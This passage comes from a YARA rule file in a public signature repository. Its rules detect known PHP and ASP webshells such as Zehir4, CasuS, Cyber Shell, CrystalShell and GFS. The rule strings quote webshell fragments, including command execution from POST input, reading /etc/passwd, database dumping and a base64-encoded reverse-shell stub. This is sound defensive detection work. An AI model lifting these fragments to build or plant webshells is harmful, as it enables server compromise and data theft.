		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_Zehir4 {
    meta:
		description = "Webshells Github Archive - file zehir4"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6664-L6677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "788928ae87551f286d189e163e55410acbb90a64"
		logic_hash = "36b6940ffecd9be190cce62252ec7d87f1c0bc0d19b4442df63f4404eb316364"
		score = 55
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
		$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Zehir4_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "7a849bc6-fff5-5bb6-aff7-660889fd077b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6678-L6691"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
		logic_hash = "dfaf685ac3b364143bfbe289b05f066b09f01622fec3e9157f4b4791f7567619"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
		$s11 = "frames.byZehir.document.execCommand("
		$s15 = "frames.byZehir.document.execCommand(co"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Php_Webshells_Lostdc {
    meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6692-L6707"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
		logic_hash = "e3cd28f4a72f5a8a92c728fe76a7159c28256e87daf4c1dd10190a57263f5b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Casus_1_5 {
    meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "cf89d8f8-d498-57fe-98eb-a98350db182f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6708-L6721"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
		logic_hash = "0dbaa39bd33047d24e5bc9716108c5581da3f54e93d90f9c550b3d84de1ebfe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Ftpsearch {
    meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6722-L6736"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		logic_hash = "6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell__Cyber_Shell_Cybershell_Cyber_Shell__V_1_0_ {
    meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth (Nextron Systems)"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6737-L6754"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_Soldierofallah {
    meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6755-L6775"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_7 {
    meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "506373d6-31b4-5a14-b009-f2b43028a98b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6776-L6794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9d9b6b1333f2061c357fad110b5cc508288c70aea1212aa2fcbf283a2ce4fb2c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"

	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell__Small_Web_Shell_By_Zaco_Small_Zaco_Zacosmall {
    meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6795-L6813"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_8 {
    meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "40c6f69f-9963-5e4f-af44-041d47738519"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6814-L6833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "346df2686c4d43b3210b07a30845477e057602500e67baba69b50c41e8d501fa"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"

	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword

	condition:
		3 of them
}
rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_Klasvayv_Asp_Php {
    meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6834-L6852"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_9 {
    meta:
		description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
		author = "Florian Roth (Nextron Systems)"
		id = "98927127-08be-57ac-a090-38c7e614dae7"
		date = "2014-04-06"
		modified = "2022-12-06"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6854-L6874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9f8768f609ccd464f7c2b9d10ce8ea423355e11b05b39e629e5e3de0787e212b"
		score = 70
		quality = 77
		tags = ""
		super_rule = 1
		hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
		hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
		hash2 = "0daed818cac548324ad0c5905476deef9523ad73"

	strings:
		$ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b }
		$ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b }
		$ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b }
		$ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e }

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv {
    meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6876-L6892"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b2f2b95415bc990adac38eada20cbc793f286d51f2054bc969e9c667f16717f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"

	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_1 {
    meta:
		description = "PHP Webshells Github Archive - from files Dive Shell 1.0"
		author = "Florian Roth (Nextron Systems)"
		id = "9a87038b-3f78-5b9a-a209-c9026d83363f"
		date = "2014-04-06"
		modified = "2022-12-06"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6894-L6913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "9e3759d45d13e33481b962c4b59a019647a3e80bdd3885c4404169af74288b89"
		score = 70
		quality = 79
		tags = ""
		super_rule = 1
		hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
		hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
		hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
		hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"

	strings:
		$ = { 76 61 72 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3d 20 6e 65 77 20 41 72 72 61 79 28 3c 3f 70 68 70 20 65 63 68 6f 20 24 6a 73 5f 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3f 3e 29 3b }
		$ = { 69 66 20 28 65 6d 70 74 79 28 24 5f 53 45 53 53 49 4f 4e 5b 27 63 77 64 27 5d 29 20 7c 7c 20 21 65 6d 70 74 79 28 24 5f 52 45 51 55 45 53 54 5b 27 72 65 73 65 74 27 5d 29 29 20 7b }
		$ = { 69 66 20 28 65 2e 6b 65 79 43 6f 64 65 20 3d 3d 20 33 38 20 26 26 20 63 75 72 72 65 6e 74 5f 6c 69 6e 65 20 3c 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 2e 6c 65 6e 67 74 68 2d 31 29 20 7b }

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_2 {
    meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "be335331-34d7-5abc-b29b-eac7a5ec3915"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6915-L6934"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0a63d3b00ad9719140da9bb5dcb49981c4d3758fac13c392d016b47e54f356c8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
		$s4 = "\\$port = {$_POST['port']};"
		$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
		$s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
		$s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"

	condition:
		4 of them
}
rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Erne_Stres {
    meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4e73e42e-b968-5b68-a00d-d2a8a1f3541c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6935-L6956"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a0484a5a71715d6a79c89e20919ab89aaa7e85a18ee502651f1f6b29153847a3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword

	condition:
		5 of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_3 {
    meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "ff7c6534-efcf-565e-bfc0-1eaa2e9d7b7d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6957-L6976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "5c264a294fc75cf2cadd3dba61bc64658989ffe5ddecfa18ba18e66492ad3c71"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
		hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
		hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
		hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"

	strings:
		$s0 = "header('Content-Length:'.filesize($file).'');" fullword
		$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
		$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
		$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
		$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_4 {
    meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, nshell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2932cb85-927e-536b-b8d8-a0ac0d1ef8ec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L6977-L6999"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "18db4c6728f0575b4d8388dab9563ee98ca9aa5fdc8534bf76856a87820b4596"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "86bc40772de71b1e7234d23cab355e1ff80c474d"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
		$s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
		$s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
		$s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
		$s10 = "foreach ($arr as $filename) {" fullword
		$s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_GFS {
    meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7001-L7017"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Sosyete_Stres {
    meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "774f7f4c-724a-5eb0-b5de-44b389fd593d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7018-L7038"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "78aeabe38f7457060d81c3863098b5e424bc38f13e9e86bbb6ea54827f27afcd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
